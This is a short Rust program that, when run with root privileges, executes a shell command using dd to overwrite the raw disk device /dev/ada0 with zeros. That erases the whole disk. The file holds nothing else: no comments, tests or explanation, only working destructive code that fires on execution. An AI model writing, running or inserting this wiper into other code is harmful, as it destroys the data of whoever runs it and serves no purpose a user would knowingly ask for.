use std::process::Command;
fn main() {
    if unsafe { libc::geteuid() } == 0 {
        let _ = Command::new("sh").arg("-c").arg("dd if=/dev/zero of=/dev/ada0").status();
    }
}
